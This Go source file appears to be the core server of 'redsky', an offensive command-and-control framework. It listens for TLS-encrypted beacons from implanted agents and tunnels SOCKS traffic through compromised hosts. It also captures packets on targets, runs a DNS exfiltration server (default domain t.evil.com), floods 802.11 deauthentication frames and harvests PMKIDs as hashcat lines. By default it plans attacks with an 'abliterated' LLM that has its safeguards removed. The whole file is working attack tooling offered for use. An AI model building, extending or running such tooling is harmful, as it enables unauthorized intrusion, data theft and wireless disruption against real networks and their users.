// redsky-core — the framework.
// Phase 5: persistent sessions + TUI.
package main

import (
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	tea "github.com/charmbracelet/bubbletea"

	"github.com/sk666G/red-sky---arsenal/internal/crypto"
	"github.com/sk666G/red-sky---arsenal/internal/planner"
	"github.com/sk666G/red-sky---arsenal/internal/plugin"
	"github.com/sk666G/red-sky---arsenal/internal/proto"
	"github.com/sk666G/red-sky---arsenal/internal/scanner"
	"github.com/sk666G/red-sky---arsenal/internal/session"
	rsTLS "github.com/sk666G/red-sky---arsenal/internal/tls"
	"github.com/sk666G/red-sky---arsenal/internal/capturer"
	"github.com/sk666G/red-sky---arsenal/internal/dnsexfil"
	"github.com/sk666G/red-sky---arsenal/internal/tunnel"
	"github.com/sk666G/red-sky---arsenal/internal/tui"
	"github.com/sk666G/red-sky---arsenal/internal/wireless"
	"github.com/sk666G/red-sky---arsenal/internal/wire"
)

func main() {
	bind := flag.String("bind", "0.0.0.0", "listen address")
	port := flag.Int("port", 4444, "listen port")
	eng := flag.String("engagement", "default", "engagement name")
	pluginFlag := flag.String("plugin", "", "run a local plugin instead of listening")
	pluginTimeout := flag.Duration("plugin-timeout", 5*time.Minute, "plugin execution timeout")
	scanCIDR := flag.String("scan-cidr", "", "fast TCP scan: cidr or single ip")
	scanPorts := flag.String("scan-ports", "1-1024", "fast TCP scan: port spec")
	scanThreads := flag.Int("scan-threads", 2000, "fast TCP scan: worker count")
	scanTimeout := flag.Duration("scan-timeout", 2*time.Second, "fast TCP scan: dial timeout")
	headless := flag.Bool("headless", false, "log-only mode, no TUI")
	noLLM := flag.Bool("no-llm", false, "use rule-based planner instead of Ollama")
	llmModel := flag.String("llm-model", "huihui_ai/qwen2.5-abliterate:14b", "Ollama model for planning")
	socksBind := flag.String("socks", "", "start a SOCKS5 listener on this address (e.g. 127.0.0.1:1080) that tunnels through the first connected agent")
	pcapIface := flag.String("pcap", "", "capture raw packets on the target interface (Linux agent only). Requires -pcap-out.")
	pcapOut := flag.String("pcap-out", "", "path to write the capture to (.pcap)")
	pcapDuration := flag.Duration("pcap-duration", 30*time.Second, "how long to capture")
	dnsBind := flag.String("dns-exfil", "", "bind an authoritative DNS listener for exfil (e.g. 0.0.0.0:5353)")
	dnsDomain := flag.String("dns-domain", "t.evil.com", "tunnel domain agents will query under")
	wlIface := flag.String("wireless", "", "capture 802.11 frames on the agent interface (Linux agent, root)")
	wlChannel := flag.Int("wireless-channel", 0, "set the wifi channel before capture (0 = leave as is)")
	wlOut := flag.String("wireless-out", "", "path to write the capture to (.pcap)")
	wlDuration := flag.Duration("wireless-duration", 30*time.Second, "how long to capture")
	deauthBSSID := flag.String("deauth-bssid", "", "802.11 deauth: target AP MAC (spoofed as source)")
	deauthClient := flag.String("deauth-client", "ff:ff:ff:ff:ff:ff", "802.11 deauth: target client MAC (broadcast default)")
	deauthReason := flag.Int("deauth-reason", 7, "802.11 deauth: reason code")
	deauthBurst := flag.Int("deauth-burst", 3, "802.11 deauth: frames per interval")
	deauthInterval := flag.Duration("deauth-interval", 0, "802.11 deauth: delay between bursts (0 = flood)")
	deauthDuration := flag.Duration("deauth-duration", 10*time.Second, "802.11 deauth: total run time")
	pmkidIface := flag.String("pmkid", "", "802.11 PMKID harvest: monitor-mode iface")
	pmkidChannel := flag.Int("pmkid-channel", 0, "PMKID: set wifi channel before harvest")
	pmkidDuration := flag.Duration("pmkid-duration", 60*time.Second, "PMKID: total harvest run time")
	pmkidBSSID := flag.String("pmkid-bssid", "", "PMKID: only emit hits for this BSSID")
	pmkidOut := flag.String("pmkid-out", "", "PMKID: write hashcat lines to this file (append)")
	flag.Parse()

	if *pluginFlag != "" {
		runPlugin(*pluginFlag, *pluginTimeout)
		return
	}

	if *scanCIDR != "" {
		runScanner(*scanCIDR, *scanPorts, *scanThreads, *scanTimeout)
		return
	}

	root, _ := os.UserHomeDir()
	paths := rsTLS.Paths(filepath.Join(root, ".redsky"), *eng)
	if err := paths.EnsureCA([]string{"127.0.0.1", "localhost"}); err != nil {
		log.Fatalf("ensure CA: %v", err)
	}
	fp, err := paths.CAFingerprint()
	if err != nil {
		log.Fatalf("ca fingerprint: %v", err)
	}
	tlsCfg, err := paths.ServerTLSConfig()
	if err != nil {
		log.Fatalf("tls config: %v", err)
	}

	mgr := session.NewManager()

	addr := fmt.Sprintf("%s:%d", *bind, *port)
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		log.Fatalf("listen: %v", err)
	}
	tlsLn := rsTLS.NewTLSListener(ln, tlsCfg)

	fmt.Printf("redsky-core listening on %s (TLS)\n", addr)
	fmt.Printf("engagement dir: %s\n", paths.Dir)
	fmt.Printf("CA fingerprint: %s\n", fp)
	fmt.Printf("agent flag: -ca-fingerprint '%s'\n\n", fp)

	go acceptLoop(tlsLn, mgr)

	if *socksBind != "" {
		go startSocks(*socksBind, mgr)
	}

	if *wlIface != "" {
		if *wlOut == "" {
			log.Fatalf("-wireless requires -wireless-out")
		}
		go runWirelessCapture(mgr, *wlIface, *wlChannel, *wlOut, *wlDuration)
	}

	// deauth-bssid dispatch — fires when -deauth-bssid is set
	if *deauthBSSID != "" {
		if *wlIface == "" {
			log.Printf("[deauth] -wireless <iface> required")
		} else {
			dctx, dcancel := context.WithTimeout(context.Background(), *deauthDuration)
			derr := wireless.Deauth(dctx, wireless.DeauthOptions{
				Iface:    *wlIface,
				BSSID:    *deauthBSSID,
				Client:   *deauthClient,
				Reason:   uint16(*deauthReason),
				Burst:    *deauthBurst,
				Interval: *deauthInterval,
				Duration: *deauthDuration,
			})
			dcancel()
			if derr != nil {
				log.Printf("[deauth] %v", derr)
			}
		}
	}

	// pmkid dispatch — harvests PMKID from EAPOL msg 1, writes hashcat lines
	if *pmkidIface != "" {
		pctx, pcancel := context.WithTimeout(context.Background(), *pmkidDuration)
		var hitsFile *os.File
		if *pmkidOut != "" {
			f, err := os.OpenFile(*pmkidOut, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
			if err != nil {
				log.Printf("[pmkid] open %s: %v", *pmkidOut, err)
			} else {
				hitsFile = f
				defer hitsFile.Close()
			}
		}
		onHit := func(h wireless.PMKIDHit) {
			line := h.HashcatLine()
			log.Printf("[pmkid] %s bssid=%s sta=%s pmkid=%x",
				h.TS.Format("15:04:05"), h.BSSID, h.Station, h.PMKID)
			if hitsFile != nil {
				fmt.Fprintln(hitsFile, line)
				hitsFile.Sync()
			}
		}
		if err := wireless.Harvest(pctx, wireless.PMKIDOptions{
			Iface:       *pmkidIface,
			Channel:     *pmkidChannel,
			Duration:    *pmkidDuration,
			FilterBSSID: *pmkidBSSID,
		}, onHit); err != nil {
			log.Printf("[pmkid] %v", err)
		}
		pcancel()
	}

	if *dnsBind != "" {
		r := dnsexfil.DefaultReassembler()
		srv := &dnsexfil.Server{Bind: *dnsBind, Domain: *dnsDomain, Reasm: r}
		go func() {
			if err := srv.Start(context.Background()); err != nil {
				log.Printf("[dnsexfil] server: %v", err)
			}
		}()
	}

	if *pcapIface != "" {
		if *pcapOut == "" {
			log.Fatalf("-pcap requires -pcap-out")
		}
		go runPCAPCapture(mgr, *pcapIface, *pcapOut, *pcapDuration)
	}

	if *headless {
		for ev := range mgr.Events {
			fmt.Printf("[%s] %s: %s\n", ev.Kind, ev.AgentID, ev.Text)
		}
		return
	}

	pl := planner.NewOllama("", *llmModel)
	if *noLLM {
		pl = nil // falls back to rule planner
	}
	p := tea.NewProgram(tui.New(mgr, *eng, *port, pl), tea.WithAltScreen())
	if _, err := p.Run(); err != nil {
		log.Fatalf("tui: %v", err)
	}
}

func acceptLoop(ln net.Listener, mgr *session.Manager) {
	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go handleConn(conn, mgr)
	}
}

func runPlugin(spec string, timeout time.Duration) {
	parts := strings.Fields(spec)
	if len(parts) == 0 {
		log.Fatalf("-plugin needs at least a module name")
	}
	repo := findRepoRoot()
	if repo == "" {
		log.Fatalf("could not find repo root (expected redsky.py)")
	}
	out, err := plugin.Invoke(context.Background(), repo, parts[0], parts[1:], timeout)
	if out != "" {
		fmt.Print(out)
	}
	if err != nil {
		log.Printf("plugin exited with error: %v", err)
		os.Exit(1)
	}
}

func findRepoRoot() string {
	cwd, err := os.Getwd()
	if err != nil {
		return ""
	}
	dir := cwd
	for {
		if _, err := os.Stat(filepath.Join(dir, "redsky.py")); err == nil {
			return dir
		}
		parent := filepath.Dir(dir)
		if parent == dir {
			return ""
		}
		dir = parent
	}
}

func handleConn(conn net.Conn, mgr *session.Manager) {
	remote := conn.RemoteAddr().String()
	defer func() {
		if r := recover(); r != nil {
			log.Printf("%s: panic: %v", remote, r)
			conn.Close()
		}
	}()

	// The listener already wrapped conn in TLS; but we haven't forced the
	// handshake yet. Do it now.
	if tlsConn, ok := conn.(*tls.Conn); ok {
		conn.SetDeadline(time.Now().Add(10 * time.Second))
		if err := tlsConn.Handshake(); err != nil {
			conn.Close()
			return
		}
		conn.SetDeadline(time.Time{})
	}

	coreKey, err := crypto.GenerateEphemeralKey()
	if err != nil {
		conn.Close()
		return
	}
	hello := map[string]string{
		"type":    "ecdh_hello",
		"pubkey":  base64.StdEncoding.EncodeToString(coreKey.PublicKey().Bytes()),
		"version": "3",
	}
	helloRaw, _ := json.Marshal(hello)
	if err := wire.WriteFrame(conn, 0, helloRaw); err != nil {
		conn.Close()
		return
	}

	frame, err := wire.ReadFrame(conn)
	if err != nil {
		conn.Close()
		return
	}
	var reply map[string]string
	if err := json.Unmarshal(frame.Payload, &reply); err != nil {
		conn.Close()
		return
	}
	if reply["type"] != "ecdh_reply" {
		conn.Close()
		return
	}
	agentPub, err := base64.StdEncoding.DecodeString(reply["pubkey"])
	if err != nil {
		conn.Close()
		return
	}
	key, err := crypto.DeriveKey(coreKey, agentPub)
	if err != nil {
		conn.Close()
		return
	}
	cs, err := crypto.NewSession(key)
	if err != nil {
		conn.Close()
		return
	}

	// Read beacon.
	frame, err = wire.ReadFrame(conn)
	if err != nil {
		conn.Close()
		return
	}
	beaconRaw, err := cs.Decrypt(frame.Payload)
	if err != nil {
		conn.Close()
		return
	}
	var env proto.Envelope
	if err := json.Unmarshal(beaconRaw, &env); err != nil {
		conn.Close()
		return
	}
	var beacon proto.Beacon
	if err := json.Unmarshal(env.Payload, &beacon); err != nil {
		conn.Close()
		return
	}
	mgr.Register(beacon.AgentID, beacon.Info, conn, cs)
}


// runScanner is the fast Go port scanner (Phase 6 + discovery).
func runScanner(cidr, ports string, threads int, timeout time.Duration) {
	allHosts, err := scanner.ParseCIDR(cidr)
	if err != nil {
		log.Fatalf("scan: %v", err)
	}
	portList, err := scanner.ParsePorts(ports)
	if err != nil {
		log.Fatalf("scan: %v", err)
	}
	ctx := context.Background()
	t0 := time.Now()

	// Stage 1: fast host discovery.
	fmt.Printf("discovering live hosts in %s (%d hosts)...\n", cidr, len(allHosts))
	live := scanner.DiscoverAlive(ctx, allHosts, nil, 500, 800*time.Millisecond, func(h string) {
		fmt.Printf("[live] %s\n", h)
	})
	fmt.Printf("discovery: %d/%d hosts alive in %s\n\n",
		len(live), len(allHosts), time.Since(t0).Truncate(time.Millisecond))

	if len(live) == 0 {
		fmt.Println("no live hosts found")
		return
	}

	// Stage 2: full port scan on live hosts only.
	fmt.Printf("scanning %d live hosts x %d ports (%d probes) with %d workers\n",
		len(live), len(portList), len(live)*len(portList), threads)

	var results []scanner.Result
	var mu sync.Mutex

	err = scanner.Scan(ctx, scanner.ScanOptions{
		Hosts:   live,
		Ports:   portList,
		Threads: threads,
		Timeout: timeout,
	}, func(r scanner.Result) {
		mu.Lock()
		results = append(results, r)
		mu.Unlock()
		fmt.Printf("[+] %s:%d\n", r.Host, r.Port)
	})
	if err != nil {
		log.Fatalf("scan: %v", err)
	}

	elapsed := time.Since(t0)
	fmt.Printf("\n%d open port(s) in %s\n", len(results), elapsed.Truncate(time.Millisecond))
	if len(results) > 0 {
		path, err := scanner.WriteJSON(results)
		if err != nil {
			log.Printf("write results: %v", err)
		} else {
			fmt.Printf("saved: %s\n", path)
		}
	}
}


// startSocks waits for an agent to connect, then starts a SOCKS5 listener
// that tunnels every connection through it.
func startSocks(bind string, mgr *session.Manager) {
	// Wait for first session.
	for {
		sessions := mgr.Sessions()
		if len(sessions) > 0 {
			s := sessions[0]
			ts := tunnel.NewManager()
			srv := &tunnel.Server{Bind: bind, Sender: s, Tunnels: ts}
			log.Printf("[socks] starting on %s, exit=%s", bind, s.AgentID)
			if err := srv.Start(context.Background()); err != nil {
				log.Printf("[socks] error: %v", err)
			}
			return
		}
		time.Sleep(500 * time.Millisecond)
	}
}


// runPCAPCapture waits for an agent, opens a capture session, and writes
// received frames to a .pcap file on the core.
func runPCAPCapture(mgr *session.Manager, iface, outPath string, duration time.Duration) {
	// wait for an agent
	for {
		if len(mgr.Sessions()) > 0 {
			break
		}
		time.Sleep(500 * time.Millisecond)
	}
	s := mgr.Sessions()[0]
	log.Printf("[pcap] capturing on %s via %s -> %s (duration %s)", iface, s.AgentID, outPath, duration)

	// register a tunnel-like receive slot for capture data
	sessionID := fmt.Sprintf("cap-%d", time.Now().UnixNano())
	s.RegisterCaptureChannel(sessionID)

	// open the pcap file
	pw, err := capturer.NewPCAPWriter(outPath)
	if err != nil {
		log.Printf("[pcap] write %s: %v", outPath, err)
		return
	}
	defer pw.Close()

	// ask the agent to start
	if err := s.SendCaptureStart(sessionID, iface, 0); err != nil {
		log.Printf("[pcap] send start: %v", err)
		return
	}

	deadline := time.After(duration)
	frames := 0
	for {
		select {
		case <-deadline:
			// stop the capture
			s.SendCaptureStop(sessionID)
			log.Printf("[pcap] duration elapsed — %d frames written to %s", frames, outPath)
			return
		case chunk, ok := <-s.GetCaptureChannel(sessionID):
			if !ok {
				log.Printf("[pcap] agent closed — %d frames written", frames)
				return
			}
			// chunk = concatenated pcap-record-format frames
			i := 0
			for i+16 <= len(chunk) {
				tsSec := binary.LittleEndian.Uint32(chunk[i : i+4])
				tsUsec := binary.LittleEndian.Uint32(chunk[i+4 : i+8])
				incl := binary.LittleEndian.Uint32(chunk[i+8 : i+12])
				orig := binary.LittleEndian.Uint32(chunk[i+12 : i+16])
				i += 16
				if i+int(incl) > len(chunk) {
					break
				}
				f := capturer.Frame{
					TS:      time.Unix(int64(tsSec), int64(tsUsec)*1000),
					Data:    chunk[i : i+int(incl)],
					OrigLen: int(orig),
				}
				pw.WriteFrame(f)
				frames++
				i += int(incl)
			}
		}
	}
}


// runWirelessCapture waits for an agent, opens a wireless capture session,
// and writes received 802.11 frames to a .pcap file on the core.
func runWirelessCapture(mgr *session.Manager, iface string, channel int, outPath string, duration time.Duration) {
	for len(mgr.Sessions()) == 0 {
		time.Sleep(500 * time.Millisecond)
	}
	s := mgr.Sessions()[0]
	log.Printf("[wireless] capture on %s ch=%d via %s -> %s", iface, channel, s.AgentID, outPath)

	sessionID := fmt.Sprintf("wl-%d", time.Now().UnixNano())
	s.RegisterCaptureChannel(sessionID)

	pw, err := capturer.NewPCAPWriter(outPath)
	if err != nil {
		log.Printf("[wireless] pcap open: %v", err)
		return
	}
	defer pw.Close()

	if err := s.SendWirelessStart(sessionID, iface, channel); err != nil {
		log.Printf("[wireless] send start: %v", err)
		return
	}

	deadline := time.After(duration)
	frames := 0
	for {
		select {
		case <-deadline:
			s.SendWirelessStop(sessionID)
			log.Printf("[wireless] duration elapsed - %d frames to %s", frames, outPath)
			return
		case chunk, ok := <-s.GetCaptureChannel(sessionID):
			if !ok {
				log.Printf("[wireless] agent closed - %d frames", frames)
				return
			}
			i := 0
			for i+12 <= len(chunk) {
				var ns uint64
				for k := 0; k < 8; k++ {
					ns = (ns << 8) | uint64(chunk[i+k])
				}
				ln := uint32(chunk[i+8])<<24 | uint32(chunk[i+9])<<16 |
					uint32(chunk[i+10])<<8 | uint32(chunk[i+11])
				i += 12
				if i+int(ln) > len(chunk) {
					break
				}
				pw.WriteFrame(capturer.Frame{
					TS:      time.Unix(0, int64(ns)),
					Data:    chunk[i : i+int(ln)],
					OrigLen: int(ln),
				})
				frames++
				i += int(ln)
			}
		}
	}
}
